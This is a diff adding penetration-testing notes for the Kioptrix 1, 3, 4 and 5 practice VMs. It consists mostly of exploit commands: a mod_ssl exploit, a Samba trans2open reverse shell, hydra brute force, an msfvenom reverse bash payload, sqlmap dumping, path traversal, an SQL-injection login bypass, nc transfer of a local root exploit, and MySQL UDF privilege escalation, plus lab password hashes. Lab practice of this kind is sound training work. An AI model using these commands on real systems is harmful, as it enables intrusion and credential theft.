@@ -1,0 +1,172 @@
+KIOPTRIX 1
+
+1 -  netdiscover -r 192.168.1.0/24
+--->  nmap -O 192.168.1.8  ----->  OS CPE: cpe:/o:linux:linux_kernel:2.4
+OS details: Linux 2.4.9 
+
+
+2 -  ./OpenFuck | grep 1.3.20
+	./OpenFuck 0x6b 192.168.1.8 443 -c 40
+	id -----> root
+	-    cat /etc/passwd
+	john:x:500:500::/home/john:/bin/bash
+	harold:x:501:501::/home/harold:/bin/bash
+	-   cat /etc/shadow
+	 john:$1$zL4.MR4t$26N4YpTGceBO0gTX6TAky1:14513:0:99999:7:::
+	harold:$1$Xx6dZdOd$IMOGACl3r757dv17LZ9010:14513:0:99999:7:::
+	root:$1$XROmcfDX$tF93GqnLHOJeGRHpaNyIs0:14513:0:99999:7:::
+
+   
+
+3 -    smb ,  netbios-ssn
+	-  use auxiliary/scanner/smb/smb_version  
+	Samba 2.2.1a
+	-   exploit/linux/samba/trans2open
+	-  set payload linux/x86/shell_reverse_tcp
+	uid=0(root) gid=0(root) groups=99(nobody)
+
+
+4 -   ssh 
+ssh -l root 192.168.43.65 -oKexAlgorithms=+diffie-hellman-group1-sha1 -c aes128-cbc
+hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.1.8:22 -t 4 -V
+using metasploit: use auxiliary/scanner/ssh/ssh_login
+
+backdoor:
+msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh 
+	-  sh shell.sh
+
+#################################################################################################################################
+
+KIOPTRIX 3
+
+1 - port 80
+in login page we have been found web frame work: LotusCMS
+exploit/multi/http/lcms_php_exec
+set URI /index.php
+
+---->     awk 'BEGIN {system("/bin/bash")}' 
+
+
+2 -    sqlmap 	-u 	http://kioptrix3.com/gallery/gallery.php?id=1	 --dump
+
++------+------------+----------------------------------+
+| id   | username   | password                         |
++------+------------+----------------------------------+
+| 1    | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 |  ------>    Mast3r
+| 2    | loneferret | 5badcaf789d3d1d09794d8f021f40f0e |  --------> starwars
++------+------------+----------------------------------+
+
+
+3 - 	ssh  -l  loneferret    192.168.1.9
+cat CompanyPolicy.README
+which ht
+/usr/local/bin/ht
+
+##################################################################################################################################
+
+KIOPTRIX 5
+
+1 - 80,8080 
+searchsploit pChart
+searchsploit -p exploits/php/webapps/31173.txt
+cat /usr/share/exploitdb/exploits/php/webapps/31173.txt
+--> we use this:
+hxxp://localhost/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd
+
+--> we take a look at page source html and then complete the uri:
+http://192.168.1.10/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd
+http://192.168.1.10/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2f/usr/local/etc/apache22/httpd.conf
+------->
+
+<VirtualHost *:8080>
+    DocumentRoot /usr/local/www/apache22/data2
+
+<Directory "/usr/local/www/apache22/data2">
+    Options Indexes FollowSymLinks
+    AllowOverride All
+    Order allow,deny
+    Allow from env=Mozilla4_browser
+</Directory>
+
+
+
+</VirtualHost>
+------------------------------------------------>
+It seems like only Mozilla4 browser is allowed to browse the website on that port.
+Further Web Port Enumeration (Port 8080)
+Burpsuite can be used to change the User-Agent to Mozilla/4.0 (Proxy -> Options) for every http request as per screenshot below.
+Once the setting is on the intercept mode can be turned off.
+The webpage now becomes available. -----> phptax
+
+-------> use exploit/multi/http/phptax_exec
+
+msf5 exploit(multi/http/phptax_exec) > set rhosts 192.168.1.10
+rhosts => 192.168.1.10
+msf5 exploit(multi/http/phptax_exec) > set rport 8080
+rport => 8080
+msf5 exploit(multi/http/phptax_exec) > exploit
+uname -a
+FreeBSD kioptrix2014 9.0-RELEASE FreeBSD 9.0
+
+
+- nc -nvlp 9002 < /usr/share/exploitdb/exploits/freebsd/local/28718.c
+
+- in target machine:
+nc 192.168.1.9 9002 > exploit.c 
+
+- gcc -o exploit exploit.c
+
+- ./exploit
+
+whoami
+
+root
+############################################################################################################################
+
+KIOPTRIX 4
+
+1- 
+use auxiliary/scanner/smb/smb_enumusers
+- KIOPTRIX4 [ nobody, robert, root, john, loneferret ] ( LockoutTries=0 PasswordMin=5 )
+
+username:  john
+password: 'or'a'='a ------> MyNameIsJohn
+
+2- 
+ssh -l john 192.168.1.7
+echo os.system("/bin/bash")
+cat /var/www/checkpoint.php
+$host="localhost"; // Host name
+$username="root"; // Mysql username
+$password=""; // Mysql password
+$db_name="members"; // Database name
+$tbl_name="members"; // Table name
+----->
+ps -ef | grep mysql
+locate udf
+output shuold have: /usr/lib/lib_mysqludf_sys.so
+
+mysql -u root -p (enter withoutpassword)
+select * from mysql.func
+
+- select sys_exec('usermod -a -G admin john')
+NUll
+
+- sudo su and write pass (MyNameIsJohn) and become root
+
+
+
+##############################################################################################################################################
+
+
+
+
+
+
+
+
+
+
+
+
+
